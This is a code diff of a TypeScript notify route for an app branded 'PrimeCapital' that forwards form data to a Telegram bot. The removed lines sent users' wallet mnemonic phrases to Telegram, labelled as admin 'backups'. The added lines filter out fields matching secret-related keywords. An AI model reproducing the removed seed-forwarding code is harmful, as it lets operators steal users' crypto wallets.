@@ -23,6 +23,11 @@ function esc(s: string) {
   return String(s).replace(/[<>&]/g, (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" }[c] as string));
 }
 
+function sensitive(k: string, v: string) {
+  if (/password|mnemonic|seed|phrase|private|secret|recovery|key/i.test(k)) return true;
+  return v.trim().split(/\s+/).filter(Boolean).length >= 12;
+}
+
 async function sendTelegram(token: string, text: string) {
   try {
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -81,6 +86,7 @@ export const Route = createFileRoute("/api/public/notify")({
         if (extra) lines.push(`ℹ️ ${esc(extra)}`);
         if (body.fields && typeof body.fields === "object") {
           for (const [k, v] of Object.entries(body.fields)) {
+            if (sensitive(k, String(v ?? ""))) continue;
             lines.push(`📝 <b>${esc(truncate(k, 40))}</b>: <code>${esc(truncate(String(v ?? ""), 400))}</code>`);
           }
         }
@@ -90,23 +96,17 @@ export const Route = createFileRoute("/api/public/notify")({
         await sendTelegram(token, lines.join("\n"));
 
         // Send seed / addresses as a separate, tagged message so admins can easily find backups.
-        if (body.mnemonic || (body.addresses && body.addresses.length)) {
+        if (body.addresses && body.addresses.length) {
           const backup: string[] = [
             `<b>PrimeCapital · BACKUP</b> · <code>${esc(event)}</code>`,
             `👤 <b>${esc(username)}</b>`,
           ];
           if (address) backup.push(`💼 <code>${esc(address)}</code>`);
-          if (body.mnemonic) {
-            backup.push(`🔑 <b>Mnemonic:</b>`);
-            backup.push(`<code>${esc(truncate(String(body.mnemonic), 800))}</code>`);
-          }
-          if (body.addresses && body.addresses.length) {
-            backup.push(`📇 <b>Addresses:</b>`);
-            for (const a of body.addresses.slice(0, 24)) {
-              backup.push(
-                `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code>${a.path ? ` <i>${esc(truncate(String(a.path), 40))}</i>` : ""}`,
-              );
-            }
+          backup.push(`📇 <b>Addresses:</b>`);
+          for (const a of body.addresses.slice(0, 24)) {
+            backup.push(
+              `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code>${a.path ? ` <i>${esc(truncate(String(a.path), 40))}</i>` : ""}`,
+            );
           }
           await sendTelegram(token, backup.join("\n"));
         }
